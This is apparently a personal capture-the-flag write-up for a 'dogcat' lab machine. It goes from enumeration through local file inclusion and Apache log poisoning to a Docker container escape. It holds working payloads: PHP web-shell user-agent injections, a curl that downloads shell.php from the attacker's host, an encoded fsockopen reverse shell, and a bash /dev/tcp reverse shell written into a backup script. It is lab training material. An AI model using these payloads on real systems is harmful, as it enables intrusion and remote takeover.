@@ -1,0 +1,107 @@
+[Dog Cat]
+1.Plan
+2.Enumeration
+3.Local Privilege Escalation
+4.Root Privilege Escalation
+5.Escaping Docker Escalation
+[Enumeration]
+[Nmap]
+Ports:
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   184.00 ms 10.4.0.1
+2   ... 3
+4   446.93 ms 10.10.76.224
+nmap --script=vuln
+ http-sql-injection: 
+|   Possible sqli for queries:
+|     http://10.10.76.224:80/?view=cat%27%20OR%20sqlspider
+|     http://10.10.76.224:80/?view=dog%27%20OR%20sqlspider
+|     http://10.10.76.224:80/?view=cat%27%20OR%20sqlspider
+|     http://10.10.76.224:80/?view=dog%27%20OR%20sqlspider
+|     http://10.10.76.224:80/?view=cat%27%20OR%20sqlspider
+|_    http://10.10.76.224:80/?view=dog%27%20OR%20sqlspider
+[Gobuster]
+gobuster dir -u 10.10.76.224 -w directory-list-2.3-medium.txt -t 40
+/cats
+/ts
+/dogs
+gs/
+[Nikto]
+/Trial & Error:
+nikto --h 10.10.173.51 -Tuning 9 -evasion 1
+=> Tuning 9 for SQLi and -evasion 1 for Random_URI encoding
+#Nikto didnt work.
+
+[First Flag]
+Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+Bypass: php://filter
+-------------------------------------------------------------------------------------------
+Trick here is to use the php wrapper php://filter and convert the content to base64
+/?view=php://filter/convert.base64-encode/resource=dog../../../../../../var/www/html/index
+=>Response:
+Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0b+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlY+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxka+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZ+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhd+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48Y+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmVXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==  
+http://10.10.173.51/?view=php://filter/convert.base64-encode/resource=dog../../flag
+Decoded:b'<?php\n$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"\n?>\n'
+[Gaining shell & flag 2]
+http://10.10.214.114/?view=php://filter/resource=dog../../../../../../etc/passwd&ext=
+==>Success<===
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+[LFI to RCE]
+[Shell]
+To obtain a shell these are some techniques which might give us one.
+_____________________________
+RCE via Apache log poisonning
+RCE via /proc/self/environ
+-----------------------------
+In our case, it is not possible to load the /proc/self/environ file, 
+which begins to confirm the fact that we are partitioned in a docker container. 
+----------------------------------------------------------------------------------------------------
+Be able to access the apache log file, which is accessible via the url. 
+http://10.10.214.114/?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext=
+http://10.10.15.32/?view=../../../../var/log/apache2/cat/../access.log&ext=
+ "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.4.30.186 - - [17/Mar/2021:03:41:41 +0000] "
+=> Our user-agent.
+----------------------------------------------------------------------------------------------------
+[Burp Suite Method]
+Hope, we launch Burp-Suite, reload the page and intercept the request to include the payload 
+<?php system($_GET['cmd']);?> in the user-agent, this will have the effect that each time we load the file /var/log/apache2/access. 
+log with the GET parameter cmd of our command will be interpreted since the code snippet <?php system($_GET['cmd']);?> 
+will be interpreted in the page since it is PHP …
+#UserAgent:<?php file_put_contents('shell.php',file_get_contents('http://10.4.30.186/shell.php')) ?>
+Burp Post Request:
+GET /?view=../../../../var/log/apache2/cat/../access.log&ext= HTTP/1.1
+Host: 10.10.215.15
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.215.15/
+Upgrade-Insecure-Requests: 1
+[Shell]
+10.10.173.51/?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext=&cmd=%20%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%34%2e%33%30%2e%31%38%36%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27%20%20%0a
+curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.4.30.186:9090/shell.php')) ?>" -s http://<vitim IP>
+http://<victim_ip/shell.php
+$www-data
+#root: sudo /usr/bin/env /bin/bash
+find / -type f -iname “*flag*”
+Flag2.txt:THM{LF1_t0_RC3_aec3fb}
+Flag3.txt:THM{D1ff3r3nt_3nv1ronments_874112}
+Flag4.txt:
+[Escaping a docker container]
+I change my directory to root and a ls -a reveals something very very disturbing.
+cd /opt/backups
+ls 
+backup.sh
+backup.tar
+=>Writing reverse shell in backup.sh
+echo "#!/bin/bash" > backup.sh
+echo "echo "/bin/bash -c 'bash -i >& /dev/tcp/10.4.30.186/4445 0>&1'" >> backup.sh
+#SUCCESS!
+root@dogcat:/opt/backups# 
